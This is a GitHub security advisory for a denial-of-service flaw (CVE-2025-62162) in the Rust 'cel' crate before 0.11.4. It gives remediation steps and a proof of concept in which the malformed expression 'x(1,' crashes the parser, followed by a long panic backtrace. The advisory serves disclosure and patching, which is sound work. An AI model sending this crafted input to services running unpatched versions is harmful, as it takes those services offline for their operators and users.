# [H] cel-rust May Panic During Parsing of Invalid CEL Expressions

## Summary
Severity: High
Advisory: GHSA-wxwx-9fh7-5mrw
CVE: CVE-2025-62162
CWE: CWE-20
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-10-11
Source: https://github.com/advisories/GHSA-wxwx-9fh7-5mrw
Type: github-advisory

## Affected
- crates.io: `cel` — affected >=0.10.0 <0.11.4

## Details
### Summary

Parsing certain malformed CEL expressions can cause the parser to panic, terminating the process. When the crate is used to evaluate untrusted expressions (e.g., user-supplied input over an API), an attacker can send crafted input to trigger a denial of service (DoS).

### Remediation
Upgrade to 0.11.4
```toml
[dependencies]
cel = "0.11.4"
```

### PoC

```rust
use cel::{Context, Program};

fn main() {
    let program = Program::compile("x(1,").unwrap();
    let context = Context::default();
    let value = program.execute(&context).unwrap();
    assert_eq!(value, true.into());
}
```

```
$ RUST_BACKTRACE=1 cargo run --bin example-simple
   Compiling num-traits v0.2.19
   Compiling aho-corasick v1.1.3
   Compiling regex-syntax v0.8.5
   Compiling arbitrary v1.4.1
   Compiling serde v1.0.219
   Compiling thiserror v1.0.69
   Compiling regex-automata v0.4.9
   Compiling chrono v0.4.41
   Compiling regex v1.11.1
   Compiling cel v0.10.0 (/home/john/git/cel-rust/cel)

warning: `cel` (lib) generated 15 warnings
   Compiling example v0.1.0 (/home/john/git/cel-rust/example)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 2.97s
     Running `target/debug/example-simple`

thread 'main' panicked at /home/john/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/antlr4rust-0.3.0-beta3/src/tree.rs:383:9:
internal error: entered unreachable code: should have been properly implemented by generated context when reachable
stack backtrace:
   0: __rustc::rust_begin_unwind
   1: core::panicking::panic_fmt
   2: antlr4rust::tree::Visitable::accept
   3: <cel::parser::gen::celparser::UnaryContextAll as antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor>>::accept
   4: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
   5: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
   6: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
   7: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_calc
   8: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_calc
   9: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::CalcContextExt>>::accept
  10: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  11: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  12: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  13: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_relation
  14: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_relation
  15: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::RelationContextExt>>::accept
  16: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  17: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  18: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  19: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_conditionalAnd
  20: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_conditionalAnd
  21: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::ConditionalAndContextExt>>::accept
  22: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  23: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  24: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  25: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_conditionalOr
  26: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_conditionalOr
  27: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::ConditionalOrContextExt>>::accept
  28: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  29: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  30: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  31: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_expr
  32: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_expr
  33: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::ExprContextExt>>::accept
  34: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  35: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  36: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  37: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_GlobalCall::{{closure}}
  38: <core::iter::adapters::map::Map<I,F> as core::iter::traits::iterator::Iterator>::next
  39: alloc::vec::Vec<T,A>::extend_desugared
  40: <alloc::vec::Vec<T,A> as alloc::vec::spec_extend::SpecExtend<T,I>>::spec_extend
  41: <alloc::vec::Vec<T> as alloc::vec::spec_from_iter_nested::SpecFromIterNested<T,I>>::from_iter
  42: <alloc::vec::Vec<T> as alloc::vec::spec_from_iter::SpecFromIter<T,I>>::from_iter
  43: <alloc::vec::Vec<T> as core::iter::traits::collect::FromIterator<T>>::from_iter
  44: core::iter::traits::iterator::Iterator::collect
  45: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_GlobalCall
  46: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_GlobalCall
  47: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::GlobalCallContextExt>>::accept
  48: <cel::parser::gen::celparser::PrimaryContextAll as antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor>>::accept
  49: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  50: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  51: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  52: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_PrimaryExpr
  53: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_PrimaryExpr
  54: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::PrimaryExprContextExt>>::accept
  55: <cel::parser::gen::celparser::MemberContextAll as antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor>>::accept
  56: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  57: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  58: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  59: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_MemberExpr
  60: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_MemberExpr
  61: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::MemberExprContextExt>>::accept
  62: <cel::parser::gen::celparser::UnaryContextAll as antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor>>::accept
  63: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  64: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  65: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  66: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_calc
  67: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_calc
  68: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::CalcContextExt>>::accept
  69: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  70: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  71: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  72: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_relation
  73: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_relation
  74: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::RelationContextExt>>::accept
  75: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  76: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  77: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  78: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_conditionalAnd
  79: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_conditionalAnd
  80: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::ConditionalAndContextExt>>::accept
  81: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  82: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  83: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  84: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_conditionalOr
  85: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_conditionalOr
  86: cel::parser::gen::celparser::<impl antlr4rust::tree::Visitable<dyn cel::parser::gen::celvisitor::CELVisitor> for antlr4rust::parser_rule_context::BaseParserRuleContext<cel::parser::gen::celparser::ConditionalOrContextExt>>::accept
  87: <dyn cel::parser::gen::celparser::CELParserContext+Ctx = cel::parser::gen::celparser::CELParserContextType+TF = antlr4rust::token_factory::CommonTokenFactory as antlr4rust::tree::VisitableDyn<T>>::accept_dyn
  88: <T as antlr4rust::tree::VisitChildren<Node>>::visit_node
  89: <cel::parser::parser::Parser as antlr4rust::tree::ParseTreeVisitorCompat>::visit
  90: <cel::parser::parser::Parser as cel::parser::gen::celvisitor::CELVisitorCompat>::visit_expr
  91: <T as cel::parser::gen::celvisitor::CELVisitor>::visit_expr
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
```

### Impact
Users accepting untrusted CEL expressions

## References
- https://github.com/cel-rust/cel-rust/security/advisories/GHSA-wxwx-9fh7-5mrw
- https://nvd.nist.gov/vuln/detail/CVE-2025-62162
- https://github.com/cel-rust/cel-rust/commit/9df9822d81d91a3ce0fc9f712f4574a659247be3
- https://github.com/cel-rust/cel-rust
- https://github.com/cel-rust/cel-rust/releases/tag/cel-v0.11.4
